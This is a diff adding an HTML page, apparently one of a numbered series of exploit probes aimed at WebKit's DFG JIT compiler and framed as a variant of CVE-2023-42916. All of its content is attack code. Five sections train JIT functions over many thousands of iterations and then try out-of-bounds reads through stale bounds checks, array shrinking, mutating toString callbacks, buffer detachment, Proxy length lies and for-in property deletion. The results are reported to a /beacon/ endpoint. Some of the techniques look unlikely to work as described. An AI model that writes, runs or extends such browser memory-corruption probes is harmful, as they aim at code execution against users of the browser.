@@ -1,0 +1,254 @@
+<!--
+  p696: CVE-2023-42916 variant -- DFG CSE stale bounds check
+
+  The "improved input validation" fix in Safari 17.1.2 likely relates to
+  DFG's Common Subexpression Elimination (CSE) pass keeping a stale
+  CheckBounds result after the array has been modified.
+
+  This probe tests: can DFG CSE reuse a bounds check from before an
+  array mutation, allowing a post-mutation OOB read?
+
+  Pattern:
+  1. First read at index i (DFG proves i < length, caches check)
+  2. Array mutates (length shrinks, or butterfly reallocates)
+  3. Second read at same index i (DFG reuses cached check, skips re-check)
+
+  This is distinct from p680 (basic shrink) and p695 (range analysis).
+  Here we specifically target CSE of CheckBounds nodes.
+
+  CRASH_CLASS: MODERATE (OOB read)
+  prior art: p680, p695, p602 (JIT), p622 (CVE-2023-41993 CSE)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p696</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P696-START:DFG-CSE-STALE-CHECK');
+  var results = [];
+
+  // === SECTION A: Same-index double read with mutation between ===
+  b('A:CSE-DOUBLE-READ');
+  try {
+    function doubleRead(arr, idx) {
+      var first = arr[idx]; // CheckBounds proves idx < arr.length
+      // DFG may CSE the second CheckBounds against the first
+      arr.length = 4; // mutate between reads
+      var second = arr[idx]; // stale CheckBounds says idx is safe
+      return [first, second];
+    }
+
+    // Build fresh array each iteration for training
+    for (var i = 0; i < 150000; i++) {
+      var a = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];
+      doubleRead(a, i & 3); // always idx 0-3, safe even after shrink
+    }
+    b('A:TRAINED-150K');
+
+    // Now use idx >= 4 (in bounds for first read, OOB after shrink)
+    var a2 = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];
+    var result = doubleRead(a2, 8);
+    b('A:FIRST=' + result[0] + ',SECOND=' + result[1]);
+    if (result[1] !== undefined) {
+      b('A:OOB-HIT:second-read-val=' + result[1]);
+      results.push('A:stale-cse=' + result[1]);
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: Callback-induced mutation between CSE'd checks ===
+  b('B:CALLBACK-CSE');
+  try {
+    var victimArr = [10,20,30,40,50,60,70,80,90,100,110,120,130,140,150,160];
+    var callCount = 0;
+
+    var tricky = {
+      toString: function() {
+        callCount++;
+        if (callCount > 200000) {
+          victimArr.length = 2;
+        }
+        return '5'; // index 5
+      }
+    };
+
+    function callbackRead(arr, key) {
+      // DFG should inline the property access
+      // The toString call can mutate arr between the
+      // CheckBounds (based on key's ToNumber) and the actual read
+      return arr[key];
+    }
+
+    // Train with normal string keys
+    for (var i = 0; i < 200000; i++) {
+      victimArr = [10,20,30,40,50,60,70,80,90,100,110,120,130,140,150,160];
+      callbackRead(victimArr, String(i & 15));
+    }
+    b('B:TRAINED-200K');
+
+    // Now trigger with the mutating toString
+    victimArr = [10,20,30,40,50,60,70,80,90,100,110,120,130,140,150,160];
+    callCount = 200000; // enable mutation
+    var val = callbackRead(victimArr, tricky);
+    b('B:VAL=' + val + ',ARRLEN=' + victimArr.length);
+    if (victimArr.length === 2 && val !== undefined && val !== 30) {
+      b('B:OOB-HIT:val=' + val);
+      results.push('B:callback-cse=' + val);
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: TypedArray with detached buffer between CSE'd reads ===
+  b('C:TYPED-DETACH-CSE');
+  try {
+    function typedDoubleRead(view, idx) {
+      var first = view[idx]; // CheckBounds
+      // Can we detach between reads?
+      return [first, view[idx]]; // CSE'd CheckBounds
+    }
+
+    var ab = new ArrayBuffer(128);
+    var f64 = new Float64Array(ab);
+    for (var i = 0; i < 16; i++) f64[i] = i * 3.14;
+
+    // Train
+    for (var i = 0; i < 200000; i++) {
+      var tempBuf = new ArrayBuffer(128);
+      var tempView = new Float64Array(tempBuf);
+      for (var j = 0; j < 16; j++) tempView[j] = j * 3.14;
+      typedDoubleRead(tempView, i & 15);
+    }
+    b('C:TRAINED-200K');
+
+    // Transfer (detach) the buffer via postMessage
+    var mc = new MessageChannel();
+    var ab2 = new ArrayBuffer(128);
+    var f64b = new Float64Array(ab2);
+    for (var i = 0; i < 16; i++) f64b[i] = i * 2.72;
+
+    // Read first, then detach, then read again
+    var first = f64b[8];
+    mc.port1.postMessage(ab2, [ab2]); // detach
+    var second = f64b[8]; // should be undefined on detached buffer
+    b('C:FIRST=' + first + ',SECOND=' + second + ',DETACHED=' + (ab2.byteLength === 0));
+    if (second !== undefined && ab2.byteLength === 0) {
+      b('C:OOB-HIT:detached-read=' + second);
+      results.push('C:detach=' + second);
+    }
+    mc.port1.close();
+    mc.port2.close();
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Proxy-based length lie ===
+  b('D:PROXY-LENGTH');
+  try {
+    var backing = [1,2,3,4,5,6,7,8];
+    var realLength = 8;
+
+    var proxy = new Proxy(backing, {
+      get: function(target, prop) {
+        if (prop === 'length') {
+          return realLength; // lie about length
+        }
+        return target[prop];
+      }
+    });
+
+    function proxyRead(a, idx) {
+      if (idx < a.length) { // DFG trusts proxy length
+        return a[idx]; // reads from backing array
+      }
+      return undefined;
+    }
+
+    // Train: length = 8, reads 0-7
+    for (var i = 0; i < 100000; i++) {
+      proxyRead(proxy, i & 7);
+    }
+    b('D:TRAINED-100K');
+
+    // Now lie: claim length = 64, backing is only 8
+    realLength = 64;
+    var oob = [];
+    for (var idx = 8; idx < 32; idx++) {
+      var val = proxyRead(proxy, idx);
+      if (val !== undefined) {
+        oob.push(idx + ':' + val);
+      }
+    }
+    if (oob.length > 0) {
+      b('D:OOB-HIT:' + oob.slice(0, 5).join(','));
+      results.push('D:proxy=' + oob.length);
+    } else {
+      b('D:NO-OOB');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: for-in enumeration with structure transition ===
+  b('E:FORIN-TRANSITION');
+  try {
+    function enumRead(obj) {
+      var vals = [];
+      for (var k in obj) {
+        vals.push(obj[k]);
+      }
+      return vals;
+    }
+
+    // Train with stable structure
+    var template = {};
+    for (var i = 0; i < 16; i++) template['p' + i] = i;
+
+    for (var t = 0; t < 50000; t++) {
+      enumRead(template);
+    }
+    b('E:TRAINED-50K');
+
+    // Add properties via defineProperty with getters that delete other props
+    var mutant = {};
+    for (var i = 0; i < 16; i++) mutant['p' + i] = i;
+    Object.defineProperty(mutant, 'trap', {
+      get: function() {
+        // Delete properties while for-in is iterating
+        for (var i = 0; i < 16; i++) delete mutant['p' + i];
+        return 999;
+      },
+      enumerable: true
+    });
+
+    var enumResult = enumRead(mutant);
+    var undefs = 0;
+    var weirdVals = [];
+    for (var i = 0; i < enumResult.length; i++) {
+      if (enumResult[i] === undefined) undefs++;
+      else if (typeof enumResult[i] !== 'number') {
+        weirdVals.push(i + ':' + typeof enumResult[i] + '=' + enumResult[i]);
+      }
+    }
+    b('E:ENUM-LEN=' + enumResult.length + ',UNDEFS=' + undefs + ',WEIRD=' + weirdVals.length);
+    if (weirdVals.length > 0) {
+      b('E:WEIRD-HIT:' + weirdVals.slice(0, 3).join(','));
+      results.push('E:enum-weird');
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P696-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P696-RESULT:NO-OOB-DETECTED');
+  }
+  b('P696-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p696: DFG CSE stale bounds check (CVE-2023-42916 variant)</pre></body></html>
